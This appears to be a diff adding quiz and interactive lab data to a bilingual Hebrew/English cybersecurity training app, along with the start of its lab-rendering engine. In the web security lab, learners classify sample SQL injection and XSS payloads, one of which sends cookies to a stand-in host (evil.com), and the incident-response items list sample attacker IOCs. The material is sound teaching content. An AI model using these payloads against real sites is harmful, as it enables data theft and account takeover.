+      {id:'b', text:'שימוש ב-Mimikatz לdump credentials', ans:'TTP'},
+      {id:'c', text:'IP: 185.220.101.42', ans:'IOC'},
+      {id:'d', text:'Registry key: HKCU\\Run\\UpdateService', ans:'IOC'},
+      {id:'e', text:'Lateral movement דרך SMB', ans:'TTP'},
+      {id:'f', text:'Domain: evil-c2-server.net', ans:'IOC'},
+    ],
+    categories:['🔍 IOC — ספציפי וחד-פעמי','🧠 TTP — דפוס התנהגות'],
+    catKeys:['IOC','TTP'],
+    explain:'IOC = artifact ספציפי (hash, IP, domain). TTP = דפוס עבודה של תוקף. TTPs עמידים יותר — תוקף מחליף IPs אבל לא שיטות.'
+  },
+],
+7:[ // Compliance
+  {
+    type:'classify',
+    q:'סווגי כל דרישה לתקן/רגולציה הנכונה',
+    items:[
+      {id:'a', text:'דיווח על breach תוך 72 שעות', ans:'GDPR'},
+      {id:'b', text:'אחסון נתוני כרטיסי אשראי מוצפנים', ans:'PCI'},
+      {id:'c', text:'ISMS — מדיניות אבטחה מקיפה מתועדת', ans:'ISO'},
+      {id:'d', text:'BAA עם כל ספק ענן שמחזיק PHI', ans:'HIPAA'},
+      {id:'e', text:'Data Minimization — לאסוף רק מה שצריך', ans:'GDPR'},
+      {id:'f', text:'Annual penetration testing', ans:'ISO'},
+      {id:'g', text:'Encrypt cardholder data in transit', ans:'PCI'},
+      {id:'h', text:'Right to Erasure ("right to be forgotten")', ans:'GDPR'},
+    ],
+    categories:['🇪🇺 GDPR','💳 PCI DSS','🏥 HIPAA','📋 ISO 27001'],
+    catKeys:['GDPR','PCI','HIPAA','ISO'],
+    explain:'GDPR = EU privacy. PCI = כרטיסי אשראי. HIPAA = health data US. ISO 27001 = ISMS framework. ארגון אחד יכול להיות כפוף לכולם.'
+  },
+  {
+    type:'mchoice',
+    q:'Startup SaaS מגלה שנפרצה ונתוני 500 לקוחות EU נחשפו. מה חובתה הראשונה לפי GDPR?',
+    options:[
+      {text:'לפרסם הודעה לעיתונות', correct:false, feedback:'❌ פרסום לעיתונות לא נדרש ע"י GDPR עצמו (אם כי מומלץ). החובה הראשונה היא לרגולטור.'},
+      {text:'לדווח לרגולטור ה-DPA תוך 72 שעות', correct:true, feedback:'✅ GDPR Article 33: חובת דיווח לDPA (Data Protection Authority) תוך 72 שעות. אם נפגעו data subjects — גם להם (Article 34).'},
+      {text:'לשלם קנס מרצון', correct:false, feedback:'❌ קנסות מוטלים על ידי הרגולטור, לא נשלמים מרצון. הדרישה הראשונה = דיווח.'},
+      {text:'לחכות לחקירה פנימית להשלמה לפני דיווח', correct:false, feedback:'❌ 72 שעות ממתי שגילית — לא ממתי שסיימת לחקור. דווחי עם מה שידוע ועדכני.'},
+    ],
+    explain:'GDPR Art. 33: דיווח לDPA תוך 72h. Art. 34: דיווח לdata subjects אם high risk. מחכים = קנסות נוספים.'
+  },
+  {
+    type:'order',
+    q:'Risk Management lifecycle — סדרי בסדר הנכון',
+    items:[
+      {id:'d', text:'📊 Monitor & Review — מעקב אחר effectiveness'},
+      {id:'b', text:'🔍 Risk Assessment — הערכת likelihood ו-impact'},
+      {id:'a', text:'📋 Asset Identification — מה יש לנו להגן?'},
+      {id:'c', text:'🛠️ Risk Treatment — Mitigate/Transfer/Accept/Avoid'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Assets → Risk Assessment → Treatment → Monitor. Risk management הוא מחזור — לא one-time. Monitor מוביל לassessment מחדש.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: פרטי GDPR שכל developer צריך לדעת',
+    fields:[
+      {label:'זמן מקסימלי לדיווח breach לרגולטור', placeholder:'מספר + יחידת זמן', answer:'72 שעות', alt:['72 שעות','72h','72 hours','שבעים ושתיים שעות']},
+      {label:'קנס מקסימלי כאחוז מהמחזור', placeholder:'אחוז', answer:'4%', alt:['4%','4 אחוז','ארבעה אחוז','4 percent']},
+      {label:'עיקרון: לאסוף רק נתונים הכרחיים', placeholder:'שם העיקרון', answer:'data minimization', alt:['data minimization','minimization','מינימיזציה','מינימום נתונים']},
+      {label:'זכות המשתמש למחיקת כל נתוניו', placeholder:'שם הזכות', answer:'right to erasure', alt:['right to erasure','erasure','right to be forgotten','הזכות להישכח','מחיקה']},
+    ],
+    explain:'72h, 4% turnover, Data Minimization, Right to Erasure — ארבעת הדברים שכל developer חייב לשנן לפני שbuild עם user data.'
+  },
+],
+};
+
+const ILABS_EN = {
+0:[
+  {
+    type:'classify',
+    q:'Classify each scenario by the CIA pillar it violates',
+    desc:'Click on each scenario then on the correct category',
+    items:[
+      {id:'a', text:'Ransomware encrypts the company DB files', ans:'A'},
+      {id:'b', text:'Someone read a private employee email', ans:'C'},
+      {id:'c', text:'Attacker changed a payment amount from $1,000 to $100,000', ans:'I'},
+      {id:'d', text:'DDoS took down the company website for 4 hours', ans:'A'},
+      {id:'e', text:'Developer stole proprietary code and sold it', ans:'C'},
+      {id:'f', text:'Attacker modified test results in a hospital system', ans:'I'},
+    ],
+    categories:['C — Confidentiality','I — Integrity','A — Availability'],
+    catKeys:['C','I','A'],
+    explain:'C = who sees it. I = what it says. A = is it reachable. Many scenarios affect more than one pillar.'
+  },
+  {
+    type:'order',
+    q:'Order the Defense in Depth layers from outermost to innermost',
+    items:[
+      {id:'e', text:'🔐 Data Encryption'},
+      {id:'b', text:'🌐 Perimeter Firewall'},
+      {id:'d', text:'🖥️ Endpoint Security (AV/EDR)'},
+      {id:'c', text:'🔗 Network Segmentation'},
+      {id:'a', text:'👤 Identity & MFA'},
+    ],
+    correct:['b','c','d','e','a'],
+    explain:'Perimeter → Network → Endpoint → Data → Identity. Each layer assumes the previous one may be breached.'
+  },
+  {
+    type:'mchoice',
+    q:'Scenario: An employee got an email "from the CEO" asking to reset their password via a link immediately. What is the best action?',
+    options:[
+      {text:'Reset via the link — it comes from the CEO', correct:false, feedback:'❌ Classic phishing attack. Urgent links in emails = immediate suspicion.'},
+      {text:'Call the CEO directly on a known number to verify', correct:true, feedback:'✅ Correct! Never verify by replying to the email — use out-of-band verification.'},
+      {text:'Forward to IT and wait', correct:false, feedback:'⚠️ Better than first, but not ideal. If targeted phishing, IT needs to know immediately AND you should verify.'},
+      {text:'Delete the email and do nothing', correct:false, feedback:'❌ Not enough. Report to security team — others may have received the same email.'},
+    ],
+    explain:'Social engineering exploits urgency and authority. Out-of-band verification = solution for every urgent email.'
+  },
+  {
+    type:'fill',
+    q:'Complete: STRIDE model — each letter represents a threat.',
+    fields:[
+      {label:'S', placeholder:'What does S stand for?', answer:'spoofing', alt:['spoofing','impersonation']},
+      {label:'T', placeholder:'What does T stand for?', answer:'tampering', alt:['tampering','data modification']},
+      {label:'R', placeholder:'What does R stand for?', answer:'repudiation', alt:['repudiation','denial']},
+      {label:'I', placeholder:'What does I stand for?', answer:'information disclosure', alt:['information disclosure','info disclosure','data exposure']},
+      {label:'D', placeholder:'What does D stand for?', answer:'denial of service', alt:['denial of service','dos']},
+      {label:'E', placeholder:'What does E stand for?', answer:'elevation of privilege', alt:['elevation of privilege','privilege escalation','elevation']},
+    ],
+    explain:'S=Spoofing, T=Tampering, R=Repudiation, I=Information Disclosure, D=Denial of Service, E=Elevation of Privilege.'
+  },
+],
+1:[
+  {
+    type:'classify',
+    q:'Classify each algorithm into the correct category',
+    items:[
+      {id:'a', text:'AES-256', ans:'SYM'},
+      {id:'b', text:'RSA-2048', ans:'ASYM'},
+      {id:'c', text:'SHA-256', ans:'HASH'},
+      {id:'d', text:'bcrypt', ans:'HASH'},
+      {id:'e', text:'Ed25519', ans:'ASYM'},
+      {id:'f', text:'ChaCha20', ans:'SYM'},
+      {id:'g', text:'MD5', ans:'HASH'},
+      {id:'h', text:'ECDSA', ans:'ASYM'},
+    ],
+    categories:['🔑 Symmetric','🗝️ Asymmetric','#️⃣ Hash'],
+    catKeys:['SYM','ASYM','HASH'],
+    explain:'Symmetric = one key for both directions. Asymmetric = public/private key pair. Hash = one-way, no key.'
+  },
+  {
+    type:'mchoice',
+    q:'An app stores user passwords in a DB. What is correct?',
+    options:[
+      {text:'AES-256 encryption on the password', correct:false, feedback:'❌ Encryption is reversible — if DB is breached and key exposed, all passwords are visible.'},
+      {text:'SHA-256 hash of the password', correct:false, feedback:'❌ SHA-256 is too fast — GPU tries billions per second. Rainbow tables exist. Not suitable for passwords.'},
+      {text:'bcrypt with work factor 12', correct:true, feedback:'✅ bcrypt is designed to be slow. Work factor 12 = ~250ms per computation — impractical for brute force.'},
+      {text:'Store plaintext but in encrypted DB', correct:false, feedback:'❌ Encrypted DB doesn\'t protect from DB admin, SQL injection returning plaintext, or data breach.'},
+    ],
+    explain:'Passwords = bcrypt, scrypt, or Argon2. Never SHA-*/MD5 (too fast) or AES (reversible).'
+  },
+  {
+    type:'order',
+    q:'Order the TLS Handshake steps correctly',
+    items:[
+      {id:'c', text:'🔐 Both sides derive session keys'},
+      {id:'a', text:'👋 Client Hello (supported ciphers)'},
+      {id:'d', text:'🔒 Encrypted communication (AES)'},
+      {id:'b', text:'📜 Server sends Certificate'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'TLS: Client Hello → Server Certificate → Key Derivation → Encrypted Data. Asymmetric to set up, Symmetric for data.'
+  },
+  {
+    type:'fill',
+    q:'Complete: which hash algorithm to use in each case?',
+    fields:[
+      {label:'User passwords', placeholder:'Algorithm name', answer:'bcrypt', alt:['bcrypt','argon2','scrypt']},
+      {label:'Verifying a downloaded file', placeholder:'Algorithm name', answer:'sha-256', alt:['sha-256','sha256','sha-3','sha3']},
+      {label:'Algorithm NOT to use for security', placeholder:'Algorithm name', answer:'md5', alt:['md5','sha-1','sha1']},
+      {label:'Digital signature on code', placeholder:'Algorithm name', answer:'sha-256', alt:['sha-256','sha256','sha-384','sha-512']},
+    ],
+    explain:'bcrypt/Argon2 = passwords (intentionally slow). SHA-256+ = integrity, signing. MD5/SHA-1 = broken, collision attacks exist.'
+  },
+],
+2:[
+  {
+    type:'classify',
+    q:'Classify each tool/technology into the correct category',
+    items:[
+      {id:'a', text:'Snort', ans:'IDS'},
+      {id:'b', text:'iptables', ans:'FW'},
+      {id:'c', text:'Palo Alto NGFW', ans:'FW'},
+      {id:'d', text:'Wireguard', ans:'VPN'},
+      {id:'e', text:'Cloudflare WAF', ans:'FW'},
+      {id:'f', text:'OpenVPN', ans:'VPN'},
+      {id:'g', text:'Suricata', ans:'IDS'},
+      {id:'h', text:'Zeek (Bro)', ans:'IDS'},
+    ],
+    categories:['🔥 Firewall/WAF','🕵️ IDS/IPS','🔒 VPN'],
+    catKeys:['FW','IDS','VPN'],
+    explain:'Firewall = allow/block decisions. IDS/IPS = traffic analysis and anomaly detection. VPN = encrypted remote access channel.'
+  },
+  {
+    type:'mchoice',
+    q:'Scenario: An attacker breached a web server in the DMZ. Which systems are most at risk?',
+    options:[
+      {text:'Nothing — DMZ is isolated', correct:false, feedback:'❌ DMZ is isolated from the internet but not necessarily from internal network if segmentation is misconfigured.'},
+      {text:'The DB server on internal network if there\'s a segmentation gap', correct:true, feedback:'✅ Correct. SolarWinds demonstrated this — a DMZ breach reached internal systems through segmentation gaps.'},
+      {text:'Only other servers in the DMZ', correct:false, feedback:'⚠️ Partially correct — DMZ servers are at risk, but with segmentation gaps the internal DB is at greater risk.'},
+      {text:'Only the internet', correct:false, feedback:'❌ The question is what the attacker can reach FROM the compromised server inward.'},
+    ],
+    explain:'DMZ = buffer zone. If firewall between DMZ and internal network is misconfigured — internal DB is at risk. Segmentation and Zero Trust prevent lateral movement.'
+  },
+  {
+    type:'order',
+    q:'Zero Trust access checks — order from first to last',
+    items:[
+      {id:'d', text:'📊 Monitor session continuously'},
+      {id:'b', text:'📱 Verify device health (MDM check)'},
+      {id:'a', text:'🪪 Verify identity (MFA)'},
+      {id:'c', text:'🔐 Apply least privilege access'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Identity first → Device health → Least privilege → Continuous monitoring. Zero Trust doesn\'t end at login — monitoring is ongoing.'
+  },
+  {
+    type:'fill',
+    q:'Complete: firewall rules using "deny by default" principle',
+    fields:[
+      {label:'Rule 1: HTTP from anywhere to port 80', placeholder:'ALLOW / DENY', answer:'allow', alt:['allow','permit','accept']},
+      {label:'Rule 2: SSH from unknown external IP', placeholder:'ALLOW / DENY', answer:'deny', alt:['deny','drop','block','reject']},
+      {label:'Rule 3: All other traffic (default rule)', placeholder:'ALLOW / DENY', answer:'deny', alt:['deny','drop','block','reject']},
+      {label:'Rule 4: Already established connections', placeholder:'ALLOW / DENY', answer:'allow', alt:['allow','permit','accept']},
+    ],
+    explain:'Deny by default = block everything, explicitly allow what\'s needed. ESTABLISHED = stateful — allows return traffic of legitimate connections.'
+  },
+],
+3:[
+  {
+    type:'classify',
+    q:'Classify each payload by attack type',
+    items:[
+      {id:'a', text:"&#x27; OR &#x27;1&#x27;=&#x27;1", ans:'SQLi'},
+      {id:'b', text:'&lt;script&gt;alert(document.cookie)&lt;/script&gt;', ans:'XSS'},
+      {id:'c', text:"&#x27;; DROP TABLE users; --", ans:'SQLi'},
+      {id:'d', text:'&lt;img onerror=fetch(&quot;evil.com&quot;+cookie)&gt;', ans:'XSS'},
+      {id:'e', text:"1 UNION SELECT username,password FROM users--", ans:'SQLi'},
+      {id:'f', text:'javascript&#58;alert(1)', ans:'XSS'},
+    ],
+    categories:["💉 SQL Injection","🔀 XSS"],
+    catKeys:['SQLi','XSS'],
+    explain:"SQLi = manipulates SQL query. XSS = runs malicious JavaScript in victim’s browser. Both = input validation failure."
+  },
+  {
+    type:'mchoice',
+    q:'A developer wrote: `query = "SELECT * FROM products WHERE id=" + request.params.id`. What is the risk and fix?',
+    options:[
+      {text:'Risk: performance. Fix: caching', correct:false, feedback:'❌ Not a performance issue — this is SQL Injection. Attacker can send ?id=1 OR 1=1 to get the entire DB.'},
+      {text:'Risk: SQL Injection. Fix: add HTTPS', correct:false, feedback:'❌ HTTPS encrypts the channel but doesn\'t protect against SQL Injection. The problem is in the code itself.'},
+      {text:'Risk: SQL Injection. Fix: parameterized query', correct:true, feedback:'✅ Correct. query = db.prepare("SELECT * FROM products WHERE id=?").get(id). Input becomes data, not SQL code.'},
+      {text:'Risk: XSS. Fix: encode output', correct:false, feedback:'❌ The issue is SQL Injection, not XSS. Output encoding matters but doesn\'t fix this vulnerability.'},
+    ],
+    explain:'Parameterized queries = the only real solution to SQLi. ORMs like Sequelize/SQLAlchemy do this automatically.'
+  },
+  {
+    type:'order',
+    q:'How does Stored XSS attack work? Order the steps.',
+    items:[
+      {id:'c', text:'🌐 Victim visits the page — script executes in their browser'},
+      {id:'a', text:'😈 Attacker posts comment with &lt;script&gt; tag'},
+      {id:'d', text:'🍪 Script steals victim\'s session cookie'},
+      {id:'b', text:'💾 Server saves malicious comment to database'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Stored XSS: post → save to DB → execute on every visitor → steal session. That\'s why "Stored" is more dangerous than Reflected.'
+  },
+  {
+    type:'fill',
+    q:'Complete: correct security headers for a web app',
+    fields:[
+      {label:'Prevents XSS — defines allowed script sources', placeholder:'Header name', answer:'content-security-policy', alt:['content-security-policy','csp','content security policy']},
+      {label:'Protects from clickjacking — blocks iframes', placeholder:'Header name', answer:'x-frame-options', alt:['x-frame-options','x frame options']},
+      {label:'Cookie that JS cannot access', placeholder:'Flag name', answer:'httponly', alt:['httponly','http-only','http only']},
+      {label:'Cookie sent only over HTTPS', placeholder:'Flag name', answer:'secure', alt:['secure']},
+    ],
+    explain:'CSP = XSS defense. X-Frame-Options = clickjacking. HttpOnly = XSS-safe cookies. Secure = HTTPS only.'
+  },
+],
+4:[
+  {
+    type:'classify',
+    q:'Classify each authentication method by factor type',
+    items:[
+      {id:'a', text:'Password', ans:'KNOW'},
+      {id:'b', text:'YubiKey', ans:'HAVE'},
+      {id:'c', text:'Fingerprint', ans:'ARE'},
+      {id:'d', text:'TOTP app (Google Authenticator)', ans:'HAVE'},
+      {id:'e', text:'PIN', ans:'KNOW'},
+      {id:'f', text:'Retina scan', ans:'ARE'},
+      {id:'g', text:'SMS OTP', ans:'HAVE'},
+      {id:'h', text:'Security question', ans:'KNOW'},
+    ],
+    categories:['🧠 Something you Know','📱 Something you Have','👤 Something you Are'],
+    catKeys:['KNOW','HAVE','ARE'],
+    explain:'MFA = two different factor types. Know+Have = good MFA. Know+Know (2 passwords) = not real MFA.'
+  },
+  {
+    type:'mchoice',
+    q:'JWT token created with alg:HS256 is stored in localStorage. What is the most critical vulnerability?',
+    options:[
+      {text:'JWT is too large for headers', correct:false, feedback:'❌ Size is a performance consideration, not a critical security vulnerability.'},
+      {text:'localStorage is XSS-accessible — JS can steal the token', correct:true, feedback:'✅ Correct. Any XSS vulnerability anywhere in the app enables: localStorage.getItem("token"). HttpOnly Cookie = the fix.'},
+      {text:'HS256 is weaker than RS256', correct:false, feedback:'⚠️ HS256 is fine with a strong secret, but that\'s not the most critical vulnerability in this scenario.'},
+      {text:'JWT is not encrypted', correct:false, feedback:'⚠️ True that JWT payload is readable (base64), but that\'s known and accepted. The critical issue is localStorage+XSS.'},
+    ],
+    explain:'HttpOnly Cookie = JavaScript cannot read it. Secure+SameSite=Strict = full protection. localStorage = always XSS-vulnerable.'
+  },
+  {
+    type:'order',
+    q:'OAuth 2.0 Authorization Code Flow — order the steps',
+    items:[
+      {id:'d', text:'🎫 App exchanges code for access token'},
+      {id:'b', text:'✅ User approves permissions on Google'},
+      {id:'a', text:'🔀 User clicks "Login with Google" — redirected to Google'},
+      {id:'e', text:'🔓 App uses token to call APIs on user\'s behalf'},
+      {id:'c', text:'↩️ Google redirects back with authorization code'},
+    ],
+    correct:['a','b','c','d','e'],
+    explain:'Authorization Code Flow: redirect → user consent → code → token exchange → API access. User is never exposed to app credentials.'
+  },
+  {
+    type:'fill',
+    q:'Complete: which MFA for each role?',
+    fields:[
+      {label:'Regular employee — daily login', placeholder:'TOTP / SMS / Hardware Key', answer:'totp', alt:['totp','authenticator','google authenticator','totp app','app']},
+      {label:'Admin / DevOps — prod access', placeholder:'TOTP / SMS / Hardware Key', answer:'hardware key', alt:['hardware key','yubikey','fido2','hardware','fido','passkey']},
+      {label:'Weakest MFA — SIM swap vulnerable', placeholder:'Method name', answer:'sms', alt:['sms','sms otp','sms code']},
+      {label:'Future MFA — biometric+device', placeholder:'Technology name', answer:'passkey', alt:['passkey','passkeys','fido2','webauthn']},
+    ],
+    explain:'SMS = weak (SIM swap). TOTP = good for most. Hardware Key = strongest for admins. Passkeys = passwordless future.'
+  },
+],
+5:[
+  {
+    type:'classify',
+    q:'Classify each scenario by attack type',
+    items:[
+      {id:'a', text:'"Your bank needs to verify your details" — mass email', ans:'PHISH'},
+      {id:'b', text:'"Hi Noa, I saw you\'re VP Engineering at Acme..." — targeted email', ans:'SPEAR'},
+      {id:'c', text:'Phone call: "I\'m from IT, I need your password for support"', ans:'VISH'},
+      {id:'d', text:'"Hi CEO, need an urgent $200K transfer" — email to CFO', ans:'WHALE'},
+      {id:'e', text:'USB found in parking lot — plugged in → malware', ans:'PHYS'},
+      {id:'f', text:'SMS: "Your account is locked, click here"', ans:'SMISH'},
+    ],
+    categories:['🎣 Phishing','🎯 Spear Phishing','🐳 Whaling','📞 Vishing','📱 Smishing','🔌 Physical'],
+    catKeys:['PHISH','SPEAR','WHALE','VISH','SMISH','PHYS'],
+    explain:'Phishing=mass. Spear=targeted. Whaling=C-level. Vishing=voice. Smishing=SMS. Physical=USB/tailgating.'
+  },
+  {
+    type:'order',
+    q:'Ransomware attack kill chain — order correctly',
+    items:[
+      {id:'e', text:'💰 Ransom demand displayed'},
+      {id:'b', text:'🦠 Malware payload executes'},
+      {id:'d', text:'🔒 Files encrypted with AES'},
+      {id:'c', text:'🕵️ Lateral movement — spreads across network'},
+      {id:'a', text:'📧 Phishing email opened — initial access'},
+    ],
+    correct:['a','b','c','d','e'],
+    explain:'Phishing → Execute → Lateral Movement → Encrypt → Ransom. Note: encryption comes LAST — after the attacker is already throughout the network.'
+  },
+  {
+    type:'mchoice',
+    q:'An employee found a USB outside the office labeled "SALARY_2024_CONFIDENTIAL.xlsx". What should she do?',
+    options:[
+      {text:'Plug into a computer to find the owner and return it', correct:false, feedback:'❌ Classic USB Drop attack! The enticing label is social engineering. USB can contain AutoRun malware, HID attack, or rubber ducky.'},
+      {text:'Plug into an isolated computer not on the network', correct:false, feedback:'❌ Even an "air-gapped" machine can be compromised. USB can emulate a keyboard (HID) and run commands.'},
+      {text:'Hand to IT/Security team and don\'t plug in', correct:true, feedback:'✅ Correct! IT has tools to examine USB safely. Employees should never plug unknown USB in any circumstance.'},
+      {text:'Throw it away — safest option', correct:false, feedback:'⚠️ Better than plugging it in, but not ideal. Security team needs to know — this is a security event requiring documentation.'},
+    ],
+    explain:'USB Drop = physical social engineering. Rubber Ducky emulates keyboard. Any unknown USB = potential malware vector.'
+  },
+  {
+    type:'fill',
+    q:'Complete: what protects against each threat?',
+    fields:[
+      {label:'What prevents WannaCry-style ransomware?', placeholder:'Short answer', answer:'patch management', alt:['patch management','patches','patching','windows update','updates']},
+      {label:'What protects from Double Extortion (beyond backup)?', placeholder:'Short answer', answer:'dlp', alt:['dlp','data loss prevention','network monitoring','segmentation']},
+      {label:'Best protection from spear phishing?', placeholder:'Short answer', answer:'security awareness', alt:['security awareness','training','awareness training','mfa']},
+      {label:'Percentage of attacks starting with phishing', placeholder:'Number', answer:'91', alt:['91','91%','~91']},
+    ],
+    explain:'Patch management = #1 against known vulnerabilities. Security awareness = #1 against social engineering. DLP = protects from data exfiltration even if breached.'
+  },
+],
+6:[
+  {
+    type:'order',
+    q:'NIST Incident Response — order the phases correctly',
+    items:[
+      {id:'c', text:'🔒 Containment — isolate infected systems'},
+      {id:'e', text:'🔄 Recovery — controlled return to operations'},
+      {id:'a', text:'📋 Preparation — policies and advance planning'},
+      {id:'d', text:'🧹 Eradication — complete malware removal'},
+      {id:'f', text:'📝 Post-Incident — lessons learned'},
+      {id:'b', text:'🚨 Detection & Analysis — identify and confirm incident'},
+    ],
+    correct:['a','b','c','d','e','f'],
+    explain:'NIST IR: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. Don\'t skip phases!'
+  },
+  {
+    type:'order',
+    q:'Order of Volatility — order from most to least volatile',
+    items:[
+      {id:'d', text:'💿 Disk / File System'},
+      {id:'b', text:'🌐 Active Network Connections'},
+      {id:'c', text:'🧠 RAM Memory'},
+      {id:'a', text:'⚡ CPU Registers & Cache'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'CPU registers → Network → RAM → Disk. Reboot loses CPU+Network+RAM entirely. Always capture volatile data first.'
+  },
+  {
+    type:'mchoice',
+    q:'You discovered a workstation spreading malware to network shares. What is the FIRST action?',
+    options:[
+      {text:'Shut it down immediately to stop the malware', correct:false, feedback:'❌ Shutdown = RAM loss (active processes, connections, encryption keys). Isolate first, don\'t shutdown.'},
+      {text:'Run antivirus scan to clean it', correct:false, feedback:'❌ Not at this stage — containment first. AV scan may alter timestamps and damage forensic evidence.'},
+      {text:'Disconnect from network (unplug) — do NOT shut down', correct:true, feedback:'✅ Containment first: disconnect from network to stop lateral movement. No shutdown — RAM contains malware artifacts for forensics.'},
+      {text:'Keep working and take screenshots as evidence', correct:false, feedback:'❌ Every second connected = malware keeps spreading. Containment first, screenshots after.'},
+    ],
+    explain:'IR: Containment = FIRST. Network isolation (not shutdown) preserves RAM for forensics and stops lateral movement.'
+  },
+  {
+    type:'classify',
+    q:'Classify each item as IOC or TTP',
+    items:[
+      {id:'a', text:'MD5: a1b2c3d4e5f6...', ans:'IOC'},
+      {id:'b', text:'Using Mimikatz to dump credentials', ans:'TTP'},
+      {id:'c', text:'IP: 185.220.101.42', ans:'IOC'},
+      {id:'d', text:'Registry key: HKCU\\Run\\UpdateService', ans:'IOC'},
+      {id:'e', text:'Lateral movement via SMB', ans:'TTP'},
+      {id:'f', text:'Domain: evil-c2-server.net', ans:'IOC'},
+    ],
+    categories:['🔍 IOC — Specific artifact','🧠 TTP — Behavioral pattern'],
+    catKeys:['IOC','TTP'],
+    explain:'IOC = specific artifact (hash, IP, domain). TTP = attacker behavior pattern. TTPs are more durable — attackers change IPs but not methods.'
+  },
+],
+7:[
+  {
+    type:'classify',
+    q:'Classify each requirement to the correct standard/regulation',
+    items:[
+      {id:'a', text:'Breach notification within 72 hours', ans:'GDPR'},
+      {id:'b', text:'Store credit card data encrypted', ans:'PCI'},
+      {id:'c', text:'ISMS — comprehensive documented security policy', ans:'ISO'},
+      {id:'d', text:'BAA with every cloud vendor handling PHI', ans:'HIPAA'},
+      {id:'e', text:'Data Minimization — collect only what\'s needed', ans:'GDPR'},
+      {id:'f', text:'Annual penetration testing', ans:'ISO'},
+      {id:'g', text:'Encrypt cardholder data in transit', ans:'PCI'},
+      {id:'h', text:'Right to Erasure ("right to be forgotten")', ans:'GDPR'},
+    ],
+    categories:['🇪🇺 GDPR','💳 PCI DSS','🏥 HIPAA','📋 ISO 27001'],
+    catKeys:['GDPR','PCI','HIPAA','ISO'],
+    explain:'GDPR=EU privacy. PCI=credit cards. HIPAA=US health data. ISO 27001=ISMS framework. One org can be subject to all.'
+  },
+  {
+    type:'mchoice',
+    q:'A SaaS startup discovers it was breached and 500 EU customer records were exposed. What is its FIRST GDPR obligation?',
+    options:[
+      {text:'Issue a press release', correct:false, feedback:'❌ Press release is not required by GDPR itself (though recommended). The first legal obligation is to the regulator.'},
+      {text:'Report to the DPA regulator within 72 hours', correct:true, feedback:'✅ GDPR Article 33: mandatory notification to DPA (Data Protection Authority) within 72 hours. If data subjects are at high risk — notify them too (Article 34).'},
+      {text:'Pay a voluntary fine', correct:false, feedback:'❌ Fines are imposed by regulators, not paid voluntarily. First requirement = notification.'},
+      {text:'Wait for internal investigation to complete before reporting', correct:false, feedback:'❌ 72 hours from when you DISCOVERED it — not from when you finished investigating. Report what you know and update.'},
+    ],
+    explain:'GDPR Art. 33: notify DPA within 72h. Art. 34: notify data subjects if high risk. Waiting = additional fines.'
+  },
+  {
+    type:'order',
+    q:'Risk Management lifecycle — order correctly',
+    items:[
+      {id:'d', text:'📊 Monitor & Review — track effectiveness'},
+      {id:'b', text:'🔍 Risk Assessment — evaluate likelihood and impact'},
+      {id:'a', text:'📋 Asset Identification — what do we need to protect?'},
+      {id:'c', text:'🛠️ Risk Treatment — Mitigate/Transfer/Accept/Avoid'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Assets → Risk Assessment → Treatment → Monitor. Risk management is a cycle — not one-time. Monitor leads back to reassessment.'
+  },
+  {
+    type:'fill',
+    q:'Complete: GDPR details every developer must know',
+    fields:[
+      {label:'Max time to report breach to regulator', placeholder:'Number + unit', answer:'72 hours', alt:['72 hours','72h','72 שעות']},
+      {label:'Max fine as % of turnover', placeholder:'Percentage', answer:'4%', alt:['4%','4 percent','four percent']},
+      {label:'Principle: collect only essential data', placeholder:'Principle name', answer:'data minimization', alt:['data minimization','minimization']},
+      {label:'User right to delete all their data', placeholder:'Right name', answer:'right to erasure', alt:['right to erasure','erasure','right to be forgotten']},
+    ],
+    explain:'72h, 4% turnover, Data Minimization, Right to Erasure — the four things every developer must know before building with user data.'
+  },
+],
+};
 // Balanced quiz/lab/game data — normalizeOptions in engine handles length bias
 
 const QUIZZES = {
@@ -1562,6 +2491,219 @@ const GAME_QS_EN = {
   {q:"DPIA required for:",o:["Every app","High-risk data processing","Regular login","Backup"],a:1},
   {q:"PCI DSS required for who processes:",o:["Medical data","Credit card data","User emails","GPS data"],a:1}
 ]};
+// HTML escape for safe rendering of item text
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+
+// ===== INTERACTIVE LAB ENGINE =====
+// Types: fill, classify, order, mchoice
+
+function renderLab(chId) {
+  const el = document.getElementById('lab-' + chId);
+  if (!el || el.dataset.rendered) return;
+  el.dataset.rendered = '1';
+  const exs = getL(chId);
+  const Lc = L();
+  const labTypeNames = currentLang==='he'
+    ? {fill:'✏️ השלמה', classify:'🗂️ סיווג', order:'🔢 סידור', mchoice:'🎭 תרחיש', complete:'הושלמו', orderSeq:'הסדר שבחרת:', orderCheck:'בדקי ✓', allDone:'כל התרגילים הושלמו!'}
+    : {fill:'✏️ Fill in', classify:'🗂️ Classify', order:'🔢 Order', mchoice:'🎭 Scenario', complete:'completed', orderSeq:'Your order:', orderCheck:'Check ✓', allDone:'All exercises done!'};
+
+  el.innerHTML = `<div class="lab-header">
+    <div class="lab-progress-row">
+      <span class="lab-progress-label" id="lab-prog-label-${chId}">0/${exs.length} ${labTypeNames.complete}</span>
+      <div class="lab-progress-bar"><div class="lab-progress-fill" id="lab-prog-fill-${chId}" style="width:0%"></div></div>
+    </div>
+  </div>` + exs.map((ex, i) => {
+    if (ex.type === 'fill')     return renderFill(chId, i, ex, Lc, labTypeNames);
+    if (ex.type === 'classify') return renderClassify(chId, i, ex, Lc, labTypeNames, exs.length);
+    if (ex.type === 'order')    return renderOrder(chId, i, ex, Lc, labTypeNames, exs.length);
+    if (ex.type === 'mchoice')  return renderMChoice(chId, i, ex, Lc, labTypeNames, exs.length);
+    return '';
+  }).join('') +
+  `<div class="lab-done-banner" id="lab-done-${chId}" style="display:none">
+    <span>🏆</span><span id="lab-done-txt-${chId}"></span>
+  </div>`;
+}
+
+function renderFill(chId, i, ex, Lc, T) {
+  const total = getL(chId).length;
+  const fields = ex.fields.map((f, fi) =>
+    `<div class="fill-row" id="fill-row-${chId}-${i}-${fi}">
+      <label class="fill-label">${f.label}</label>
+      <div class="fill-input-wrap">
+        <input class="fill-input" id="fill-inp-${chId}-${i}-${fi}" placeholder="${f.placeholder}"
